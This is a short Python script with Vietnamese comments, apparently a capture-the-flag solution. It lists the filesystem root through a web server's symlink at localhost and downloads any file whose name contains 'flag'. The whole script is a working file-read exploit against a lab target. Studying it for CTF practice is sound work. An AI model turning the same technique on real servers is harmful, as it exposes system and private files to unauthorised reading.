import requests
from bs4 import BeautifulSoup

base = "http://localhost:8080/root/"   # symlink root -> /

# 1. Lấy directory listing
r = requests.get(base)
soup = BeautifulSoup(r.text, "html.parser")

# 2. In ra các file/folder
print("[*] Files in / :")
for a in soup.find_all("a"):
    name = a.text
    print(" -", name)
    if "flag" in name:  # nếu thấy file có chữ 'flag'
        flag_url = base + name
        flag = requests.get(flag_url).text.strip()
        print("\n[+] Flag found:", flag)
